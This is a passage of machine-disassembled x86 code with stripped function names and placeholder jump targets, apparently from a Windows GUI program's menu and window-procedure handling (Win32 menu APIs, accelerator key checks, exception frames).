pop ebx
retn
mov eax esi
call sub_4516c4
test al al
je r-xdata
mov eax esi
call sub_450484
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_450494
call sub_45151c
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_450494
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_450494
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_450494
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_450494
call sub_45151c
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_450494
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_450494
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_450494
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_450494
call sub_45151c
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_451698
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_451698
and eax 0x7f
mov al [ eax + rw-data ]
sub_4516c4
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_4516c4
and eax 0x7f
mov al [ eax + rw-data ]
sub_4516f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44e3d8
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_41942c
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_45241c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_45178c
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_403290
mov eax [ esi + 0x44 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419478
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_451800
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_451800
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_44df44
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_450888
mov eax ebx
pop esi
pop ebx
retn
sub_451840
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_450484
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_450494
call sub_451840
pop ecx
test al al
je r-xdata
sub_4518d8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_451840
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_44df44
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_451908
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_4518d8
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_452c2c
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_451978
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_4518d8
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_451994
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_4518d8
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_451044
mov ebx eax
xor edx edx
mov eax edi
call sub_451540
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_4509ac
mov eax [ esi + 0x34 ]
call sub_4509ac
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_44e8e8
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_444968
push eax
call DrawMenuBar
sub_451a80
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_451a80
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_451ba5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_4518d8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_4509ac
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_451a70
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_451bd4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_423c34
xor eax eax
push ebp
push sub_451cd2
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423c34
xor eax eax
push ebp
push sub_451ca7
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_451a80
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_423c2c
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451cd9
mov eax [ rw-data ]
call sub_423c2c
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_4518d8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_451cf8
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_45207c
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_45207c
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_451db4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_452350
mov eax ebx
call sub_408560
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_451e54
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_451db4
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_404250
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_4044a0
lea edx [ ebp - 0x200 ]
call sub_408624
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_451ee8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_451f58
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4523f8
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4523f8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_4523f8
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_451f64
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_451e54
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_451ee8
mov eax ebx
call sub_45241c
jmp r-xdata
sub_451fcc
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_452014
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_44c244
mov eax ebx
call sub_451828
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_44c288
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_4194fc
sub_452050
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_419748
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_452014
sub_452094
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_4518d8
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_4518d8
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_455380
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_4520f0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_4521c5
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_4518d8
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_4518d8
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_450484
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_450494
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_4041c8
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_4041c8
mov eax [ ebp - 0xc ]
pop edx
call sub_407da8
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_452f3c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4521cc
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_404004
retn
sub_4521d8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_452094
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_4520f0
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_452350
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_451a5c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_4518d8
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_4518d8
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_408604
mov eax [ ebp + 0x10 ]
call sub_408548
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_45241c
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_43afd8
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_4523f8
mov [ ebx + 0x41 ] 0x1
sub_452444
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403440
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_4523f8
mov [ ebx + 0x41 ] 0x1
sub_4524d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_451fcc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_451e54
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_452560
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_45259c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403730#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4525e8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_452b1b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452b22
lea eax [ ebp - 0x30 ]
call sub_403fe0
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413a74
mov edx [ esi + 0x4 ]
call sub_451994
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_45e990
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413a74
mov dx [ esi + 0x4 ]
call sub_451978
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d064
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_45294e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_452931
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
